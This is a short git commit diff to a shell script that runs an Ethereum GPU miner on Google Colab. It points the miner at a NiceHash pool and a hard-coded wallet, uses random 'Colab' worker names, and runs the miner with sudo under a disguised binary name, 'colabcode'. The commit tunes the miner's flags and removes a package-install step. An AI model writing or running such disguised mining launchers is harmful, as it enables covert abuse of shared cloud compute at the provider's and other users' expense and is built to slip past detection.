8ddc1ceddb4351c69f00cf05e4720a98c09a16c3
babehdyo <widyo.babeh@gmail.com>
2021-06-13 16:31:01 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -3,6 +3,5 @@ POOL=nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353
 WALLET=35TuxzGVmh7mC1QbvHaZxaR44NdqEdpz5X
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Colab)
 
-apt update && apt-get install libpci3 libpci-dev
 chmod +x colabcode
-sudo ./colabcode -pool $POOL -wal $WALLET.$WORKER -pass x -proto 4 -stales 0
+sudo ./colabcode -pool $POOL -wal $WALLET.$WORKER -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth -nvidia
